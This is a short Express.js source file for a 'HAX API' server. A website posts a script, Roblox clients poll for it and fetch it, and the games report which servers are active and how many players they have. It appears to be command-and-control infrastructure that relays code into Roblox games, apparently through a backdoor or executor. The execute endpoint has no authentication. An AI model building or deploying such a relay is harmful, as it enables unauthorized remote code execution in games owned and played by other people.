const express = require('express');
const app = express();

// Enable CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json({ limit: '10mb' }));
app.use(express.text({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

let latestScript = "";
let gamesData = [];
let globalPlayers = 0;

// Error handling
app.use((err, req, res, next) => {
    console.error('Error:', err.message);
    res.status(500).json({ error: 'Internal server error' });
});

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({ 
        status: 'online', 
        games: gamesData.length,
        players: globalPlayers,
        timestamp: Date.now()
    });
});

// Website POSTs script
app.post('/api/execute', (req, res) => {
    try {
        latestScript = req.body || "";
        console.log('Script received:', latestScript ? latestScript.substring(0, 50) + '...' : 'empty');
        res.send('Script stored');
    } catch (e) {
        console.error('Execute error:', e);
        res.status(500).send('Error storing script');
    }
});

// Roblox GETs script
app.get('/api/execute', (req, res) => {
    try {
        res.send(latestScript || "");
        latestScript = ""; // Clear after sending
    } catch (e) {
        console.error('Execute get error:', e);
        res.status(500).send('');
    }
});

// Roblox POSTs game data
app.post('/api/games/update', (req, res) => {
    try {
        console.log('Game data received');
        
        let data;
        if (typeof req.body === 'string') {
            try {
                data = JSON.parse(req.body);
            } catch {
                data = { games: [], globalPlayers: 0 };
            }
        } else {
            data = req.body || { games: [], globalPlayers: 0 };
        }
        
        // Only store games with players > 0
        const allGames = data.games || [];
        gamesData = allGames.filter(game => parseInt(game.players) > 0);
        globalPlayers = data.globalPlayers || 0;
        
        console.log('Active games:', gamesData.length, 'Total players:', globalPlayers);
        res.status(200).send('OK');
    } catch (e) {
        console.error('Error updating games:', e);
        res.status(200).send('OK');
    }
});

// Website GETs game data
app.get('/api/games', (req, res) => {
    try {
        res.json({
            total: gamesData.length,
            players: globalPlayers || 0,
            games: gamesData
        });
    } catch (e) {
        res.json({ total: 0, players: 0, games: [] });
    }
});

// Health check
app.get('/', (req, res) => {
    res.send('HAX API Running - ' + new Date().toISOString());
});

// Handle 404
app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
});

// Handle uncaught exceptions
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`HAX Server running on port ${port}`);
    console.log(`API URL: https://hax-api-xdi2.onrender.com`);
});
